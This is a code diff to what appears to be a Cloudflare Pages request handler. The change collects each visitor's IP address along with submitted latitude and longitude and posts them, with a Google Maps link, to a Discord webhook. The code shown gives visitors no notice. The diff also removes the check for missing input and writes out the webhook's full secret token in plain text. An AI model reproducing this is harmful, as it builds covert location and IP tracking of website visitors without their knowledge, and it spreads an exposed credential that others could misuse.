@@ -3,12 +3,14 @@ export async function onRequestPost({ request }) {
     const data = await request.json();
     const { lat, lon } = data;
 
-    if (!lat || !lon) {
-      return new Response("Missing data", { status: 400 });
-    }
+    const ip = request.headers.get("cf-connecting-ip");
 
     const payload = {
-      content: `🌍 New visitor location:\nLatitude: ${lat}\nLongitude: ${lon}`
+      content: `🌍 New visitor:
+**IP:** ${ip}
+**Latitude:** ${lat}
+**Longitude:** ${lon}
+https://www.google.com/maps?q=${lat},${lon}`
     };
 
     await fetch("https://discord.com/api/webhooks/1390808867226783775/JMh8swFZEZli3sqVhR13DkXddzqjipFqIInHgHRqCnSd9z9M_DGHd68mUZDsP0l4R3kY", {
